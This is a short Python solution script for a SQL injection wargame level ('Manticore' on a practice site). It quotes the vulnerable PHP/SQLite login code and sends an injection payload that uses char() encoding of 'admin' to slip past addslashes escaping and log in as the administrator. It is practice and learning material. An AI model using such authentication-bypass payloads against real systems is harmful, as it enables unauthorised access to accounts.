#!/usr/bin/env python3
import los


def main():
    '''
    Manticore 38

    $db = sqlite_open("./db/manticore.db");
    $_GET['id'] = addslashes($_GET['id']);
    $_GET['pw'] = addslashes($_GET['pw']);
    $query = "select id from member where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>";
    $result = sqlite_fetch_array(sqlite_query($db,$query));
    if($result['id'] == "admin") solve("manticore");
    highlight_file(__FILE__);
    '''

    url = "https://los.rubiya.kr/chall/manticore_f88f07d899ad0fc8738fe3aaacff9974.php"
    cook = los.check_cookies(url)

    param = dict(id="' or id=char(97,100,109,105,110)-- ")

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('Manticore Clear!')


if __name__ == '__main__':
    main()

